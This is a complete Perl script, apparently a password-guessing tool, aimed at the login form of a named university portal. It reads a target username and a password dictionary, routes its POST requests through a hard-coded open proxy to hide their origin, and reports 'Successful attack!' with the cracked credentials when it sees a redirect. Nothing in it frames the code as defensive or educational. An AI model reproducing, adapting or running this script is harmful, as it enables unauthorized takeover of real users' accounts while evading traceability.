# miaulario web form attack perl script
use LWP::UserAgent;
use Term::ANSIColor;
use strict ;
use warnings;
my @proxies = ( 'http://149.202.249.227:3128', 'http://79.120.72.222:3128');
if ($#ARGV < 1) {
	print "Usage:\n";
	print "perl miaulario.pl <username> <dictionaryFile>\n";
	exit();
}
my $miaularioUrl = "https://miaulario.unavarra.es/portal/xlogin";
my $user = $ARGV[0];
my $file = $ARGV[1];
open (FILE,$file) || die color("red"), "Could not open file '$file'\n", color("reset");
my @dictionary = <FILE> ;
my $wagent = new LWP::UserAgent;
$ENV{HTTP_proxy} = 'http://149.202.249.227:3128'; 
$wagent->env_proxy;
my $request = new HTTP::Request 'POST',$miaularioUrl;
$a=0;
foreach(@dictionary) {
	my $password = $_ ;
        $a+=1;
	chomp($password) ;
	$request->content_type('application/x-www-form-urlencoded');
	$request->content("&eid=$user&pw=$password&submit=Identificarse");	
	my $respons = $wagent->request($request);
	my $response = $respons->as_string;	
	if ( $response =~ /1.1 302 Movido temporalmente/) {	
		print color("green"),"Successful attack! Credentials are: username=$user and password=$password\n", color("reset");
                exit() ;	
	}
        if ($a%100==0){
                print "$a passwords tested\n" ;
        }	
}
